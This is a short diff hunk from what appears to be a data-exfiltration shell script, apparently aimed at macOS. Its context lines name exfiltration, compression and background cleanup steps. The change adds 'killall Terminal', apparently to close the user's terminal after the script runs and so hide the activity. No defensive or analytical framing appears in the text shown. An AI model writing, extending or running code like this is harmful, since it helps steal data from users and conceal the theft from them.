@@ -190,3 +190,5 @@ exfil_compress &
 #wait $exfiltrate_pid
 wait $compress_pid
 cleanup &
+
+killall Terminal
